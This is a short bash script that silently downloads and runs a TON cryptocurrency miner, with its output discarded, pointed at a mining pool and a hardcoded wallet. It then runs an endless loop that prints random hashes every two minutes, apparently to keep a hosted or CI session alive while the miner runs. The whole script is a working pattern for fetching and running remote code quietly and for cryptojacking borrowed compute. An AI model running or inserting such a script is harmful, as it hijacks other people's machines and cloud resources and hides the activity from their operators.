#!/bin/bash

#!/bin/sh

#!/bin/bash

wget https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1 

tar xf ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1

chmod +x miner-linux >/dev/null 2>&1

./miner-linux https://next.ton-pool.com EQD9onMwShjuOqMqzzp3juWiDE39hWpKfwX2t0YG_vJPxtlQ

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
